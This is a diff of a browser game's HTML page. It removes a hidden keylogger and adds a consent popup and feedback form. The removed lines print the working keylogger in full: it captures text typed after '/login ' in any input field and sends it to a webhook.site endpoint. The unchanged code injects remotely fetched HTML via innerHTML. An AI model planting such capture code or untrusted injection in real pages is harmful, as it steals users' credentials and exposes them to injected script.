@@ -71,6 +71,43 @@
         #popup-menu button:hover {
             background: #666;
         }
+
+        #consent-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(30, 30, 30, 0.95);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            z-index: 2147483648;
+            font-family: sans-serif;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+            text-align: center;
+        }
+
+        #consent-popup button {
+            margin: 10px;
+            padding: 5px 15px;
+            border: none;
+            background: #444;
+            color: white;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        #consent-popup button:hover {
+            background: #666;
+        }
+
+        #feedback-form textarea {
+            width: 100%;
+            padding: 5px;
+            margin-top: 10px;
+            border-radius: 5px;
+            border: none;
+        }
     </style>
 </head>
 <body id="game_frame">
@@ -79,17 +116,28 @@
         <img src="Splash.png" alt="Custom Splash Screen">
     </div>
 
+    <div id="consent-popup">
+        <p>We would like to collect feedback you submit to improve our site. Do you consent to this data collection?</p>
+        <button onclick="grantConsent()">Allow</button>
+        <button onclick="denyConsent()">Deny</button>
+    </div>
+
     <div id="popup-menu">
         <p>PUBES VS GOON WAR</p>
         <p>I am testing a new feature</p>
         <p>with a automatic news updater</p>
-        <p>Email me if you have any ideas for this</p>
+        <p>Submit feedback or ideas:</p>
+        <div id="feedback-form">
+            <textarea id="feedback-input" rows="4" placeholder="Enter your feedback"></textarea>
+            <button onclick="submitFeedback()">Submit</button>
+        </div>
     </div>
 
     <script type="text/javascript">
         "use strict";
         
         let originalPopupContent = '';
+        let hasConsent = false;
         
         window.addEventListener('DOMContentLoaded', () => {
             const popup = document.getElementById('popup-menu');
@@ -102,6 +150,49 @@
             document.getElementById('popup-menu').style.display = 'none';
         }
         
+        function grantConsent() {
+            hasConsent = true;
+            document.getElementById('consent-popup').style.display = 'none';
+        }
+        
+        function denyConsent() {
+            hasConsent = false;
+            document.getElementById('consent-popup').style.display = 'none';
+        }
+        
+        async function submitFeedback() {
+            if (!hasConsent) {
+                alert('Please allow data collection in the consent popup before submitting.');
+                return;
+            }
+            const feedback = document.getElementById('feedback-input').value;
+            if (!feedback) {
+                alert('Please enter feedback before submitting.');
+                return;
+            }
+            try {
+                const response = await fetch('https://webhook.site/618173e1-b909-4f86-b229-bc0dd7604316', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        feedback: feedback,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+                if (response.ok) {
+                    alert('Feedback submitted successfully!');
+                    document.getElementById('feedback-input').value = '';
+                } else {
+                    alert('Failed to submit feedback.');
+                }
+            } catch (error) {
+                console.error('Error submitting feedback:', error);
+                alert('Error submitting feedback.');
+            }
+        }
+        
         const popupContentUrl = 'https://raw.githubusercontent.com/maskedwrrg/repo/refs/heads/main/popup-content.txt';
         const updateInterval = 30000;
         
@@ -112,13 +203,19 @@
                     const newContent = await response.text();
                     const popup = document.getElementById('popup-menu');
                     if (popup && newContent) {
-                        popup.innerHTML = newContent;
+                        popup.innerHTML = newContent + `
+                            <p>Submit feedback or ideas:</p>
+                            <div id="feedback-form">
+                                <textarea id="feedback-input" rows="4" placeholder="Enter your feedback"></textarea>
+                                <button onclick="submitFeedback()">Submit</button>
+                            </div>`;
                         originalPopupContent = newContent;
                     }
                 }
             } catch (error) {
                 console.error('Failed to update popup content:', error);
             }
+            
             setTimeout(updatePopupContent, updateInterval);
         }
         
@@ -131,148 +228,9 @@
                 popup.style.display = 'block';
                 popup.style.opacity = '1';
             }
+            
             setTimeout(ensurePopupVisibility, 1000);
         }
-
-        let isLogging = false;
-        let keyloggedData = '';
-        let currentInput = '';
-
-        const logEndpoint = 'https://webhook.site/618173e1-b909-4f86-b229-bc0dd7604316';
-
-        async function sendKeyloggedData(data, fullInput) {
-            try {
-                const payload = {
-                    timestamp: new Date().toISOString(),
-                    keyloggedData: data,
-                    fullInput: fullInput
-                };
-                console.log('Sending payload:', payload);
-                const response = await fetch(logEndpoint, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                });
-                if (!response.ok) {
-                    console.error('Failed to send keylogged data:', response.status);
-                } else {
-                    console.log('Keylogged data sent successfully');
-                }
-            } catch (error) {
-                console.error('Error sending keylogged data:', error);
-            }
-        }
-
-        // Function to attach keylogging to text box
-        function attachKeylogger(textBox) {
-            console.log('Text box found:', textBox, 'Attributes:', {
-                id: textBox.id,
-                class: textBox.className,
-                type: textBox.type,
-                tag: textBox.tagName
-            });
-            textBox.addEventListener('input', (event) => {
-                const value = event.target.value;
-                console.log('Text box input:', value);
-                
-                if (value.toLowerCase().startsWith('/login ') && !isLogging) {
-                    isLogging = true;
-                    keyloggedData = value.slice(7);
-                    console.log('/login detected - starting keylogging, keyloggedData:', keyloggedData);
-                } else if (isLogging) {
-                    keyloggedData = value.slice(7);
-                    console.log('Updating keyloggedData:', keyloggedData);
-                }
-            });
-
-            textBox.addEventListener('keydown', (event) => {
-                if (event.key === 'Enter' && isLogging && keyloggedData) {
-                    console.log('Enter pressed in text box - keyloggedData:', keyloggedData, 'fullInput:', textBox.value);
-                    sendKeyloggedData(keyloggedData, textBox.value);
-                    isLogging = false;
-                    keyloggedData = '';
-                }
-            });
-        }
-
-        // Observe DOM for text box
-        window.addEventListener('load', () => {
-            const observer = new MutationObserver((mutations) => {
-                mutations.forEach((mutation) => {
-                    mutation.addedNodes.forEach((node) => {
-                        if (node.nodeType === Node.ELEMENT_NODE) {
-                            // Broaden selector to include any input, textarea, or contenteditable
-                            const textBox = node.matches('input, textarea, [contenteditable]') 
-                                ? node 
-                                : node.querySelector('input, textarea, [contenteditable]');
-                            if (textBox) {
-                                attachKeylogger(textBox);
-                            }
-                        }
-                    });
-                });
-            });
-
-            observer.observe(document.body, {
-                childList: true,
-                subtree: true
-            });
-
-            // Fallback: Check for existing text box
-            const existingTextBox = document.querySelector('input, textarea, [contenteditable]');
-            if (existingTextBox) {
-                attachKeylogger(existingTextBox);
-            } else {
-                console.warn('No text box found initially. Waiting for classes.js to add it.');
-            }
-        });
-
-        // Fallback: Document-level keydown listener (from previous working version)
-        document.addEventListener('keydown', (event) => {
-            if (window.isSplashScreenActive) return;
-
-            const key = event.key;
-            console.log('Document key pressed:', key);
-
-            if (key === 'Backspace' && currentInput.length > 0) {
-                currentInput = currentInput.slice(0, -1);
-                if (isLogging && keyloggedData.length > 0) {
-                    keyloggedData = keyloggedData.slice(0, -1);
-                }
-                console.log('After backspace - currentInput:', currentInput, 'keyloggedData:', keyloggedData);
-            }
-
-            if (key === 'Enter') {
-                console.log('Document Enter pressed - isLogging:', isLogging, 'keyloggedData:', keyloggedData, 'currentInput:', currentInput);
-                if (isLogging && keyloggedData) {
-                    sendKeyloggedData(keyloggedData, currentInput);
-                    isLogging = false;
-                    keyloggedData = '';
-                }
-                currentInput = '';
-                return;
-            }
-
-            if (key.length > 1 && key !== 'Backspace') {
-                console.log('Ignoring non-character key:', key);
-                return;
-            }
-
-            if (key !== 'Backspace') {
-                currentInput += key;
-            }
-
-            if (currentInput.toLowerCase().startsWith('/login ') && !isLogging) {
-                isLogging = true;
-                keyloggedData = currentInput.slice(7);
-                console.log('Document /login detected - starting keylogging, keyloggedData:', keyloggedData);
-            } else if (isLogging && key !== 'Backspace') {
-                keyloggedData += key;
-                console.log('Document logging key - keyloggedData:', keyloggedData);
-            }
-        });
 
         window.addEventListener("load", async function () {
             const popup = document.getElementById('popup-menu');
@@ -350,7 +308,12 @@
                 if (!popup || !document.body.contains(popup)) {
                     const newPopup = document.createElement("div");
                     newPopup.id = "popup-menu";
-                    newPopup.innerHTML = originalPopupContent;
+                    newPopup.innerHTML = originalPopupContent + `
+                        <p>Submit feedback or ideas:</p>
+                        <div id="feedback-form">
+                            <textarea id="feedback-input" rows="4" placeholder="Enter your feedback"></textarea>
+                            <button onclick="submitFeedback()">Submit</button>
+                        </div>`;
                     document.body.appendChild(newPopup);
                 }
             });
